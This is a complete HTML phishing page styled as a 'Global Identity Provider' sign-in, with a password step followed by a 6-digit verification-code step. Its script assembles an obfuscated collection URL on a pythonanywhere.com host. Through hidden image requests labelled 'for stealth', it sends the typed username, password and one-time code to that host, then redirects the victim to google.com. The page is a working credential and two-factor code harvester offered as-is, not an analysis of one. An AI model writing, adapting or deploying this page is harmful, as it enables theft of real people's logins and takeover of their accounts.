<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Identity Provider</title>
    <style>
        body { background-color: #f4f7f9; font-family: Segoe UI, Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,.08); width: 350px; text-align: center; }
        .logo-circle { width: 60px; height: 60px; background: #0062ff; border-radius: 50%; margin: 0 auto 20px; color: white; line-height: 60px; font-size: 24px; font-weight: bold; }
        h1 { font-size: 20px; color: #333; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dcdfe6; border-radius: 4px; box-sizing: border-box; outline: none; }
        .btn { width: 100%; padding: 12px; background-color: #0062ff; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        #s2 { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo-circle">ID</div>
        
        <div id="s1">
            <h1>Sign In</h1>
            <p>Use your account to continue to the lab portal.</p>
            <input type="text" id="u_data" placeholder="Username / Email">
            <input type="password" id="p_data" placeholder="Password">
            <button class="btn" onclick="nextStage()">Continue</button>
        </div>

        <div id="s2">
            <h1>Security Check</h1>
            <p>Enter the code sent to your device.</p>
            <input type="text" id="c_data" placeholder="6-digit code" maxlength="6">
            <button class="btn" onclick="finalCapture()">Verify Account</button>
        </div>
    </div>

    <script>
        // Obfuscated URL for wordsess account
        const url_a = "https://wordsess";
        const url_b = ".pythonanywhere.com/capture";
        const listener = url_a + url_b;
        
        let u_val = "";

        function nextStage() {
            const u = document.getElementById('u_data').value;
            const p = document.getElementById('p_data').value;
            if (u && p) {
                u_val = u;
                // Send data using Image tag for stealth
                const payload = btoa("ID_S1|U:" + u + "|P:" + p);
                new Image().src = listener + "?data=" + payload;
                document.getElementById('s1').style.display = 'none';
                document.getElementById('s2').style.display = 'block';
            }
        }

        function finalCapture() {
            const c = document.getElementById('c_data').value;
            if (c) {
                const payload = btoa("ID_S2|U:" + u_val + "|C:" + c);
                new Image().src = listener + "?data=" + payload;
                setTimeout(() => {
                    window.location.replace("https://www.google.com");
                }, 1000);
            }
        }
    </script>
</body>
</html>
